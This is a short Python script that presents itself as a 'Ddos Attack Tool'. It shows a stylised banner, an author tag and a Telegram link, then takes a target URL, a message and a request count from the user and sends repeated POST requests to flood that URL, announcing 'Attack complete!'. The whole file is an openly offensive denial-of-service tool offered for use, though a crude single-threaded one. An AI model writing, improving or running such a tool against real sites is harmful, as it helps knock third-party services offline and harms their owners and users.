import requests
import time
from pystyle import *
import pyfiglet
import keyboard
import atexit
import os
import time as t
#-------------------------------------
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'
#------------------------------------------
enter = str(input('enter your name: '))
name = pyfiglet.figlet_format(f'welcome {enter}')
t.sleep(2)
os.system('clear')
Write.Print(name,Colors.red_to_green,interval=0.01)
t.sleep(0.75)
os.system('clear')
t.sleep(0.25)
os.system('clear')
text = 'Ddos Attack Tool'
design = pyfiglet.figlet_format(text)
Write.Print(design,Colors.red_to_green,interval=0.01)
print(Box.Lines('BY: LORD S'))
print('''
\033[35m[+]\033[39m \033[35m My Telegram user : https://t.me/MASTER_XTI .\033[39m
''')

import requests
import time

def main():
    # احصل على الرسالة من المستخدم
    message = input("\033[36msend a message:.\033[39m")
    print("\n")
    

    # احصل على عدد الطلبات من المستخدم
    requests_number = int(input("\033[36mNumber of requsets:.\033[39m"))
    print("\n")

    # احصل على عنوان URL من المستخدم
    url = input("\033[36mEnter the link:\033[39m")
    print("\n")

    # ابدأ الإرسال
    print("\033[31mTransmission started...\033[39m\n")
    requests_number_sent = 0
    for i in range(requests_number):
        requests.post(url, data={"message": message})
        time.sleep(0)
        requests_number_sent += 1
        print(f"\033[31mRequest done n.\033[39m{requests_number_sent}")

        
        
    print("\n")
    print("\033[32mAttack complete!\033[39m")
    print("\n")
    t.sleep(0.25)
    print("Do you want to make another operation ? (\033[32my\033[39m/\033[31mn\033[39m)")
    answer = input()
    if answer == "y":
        main()
    else:
        print("\033[32mSee ya..!!\033[39m")

if __name__ == "__main__":
    main()
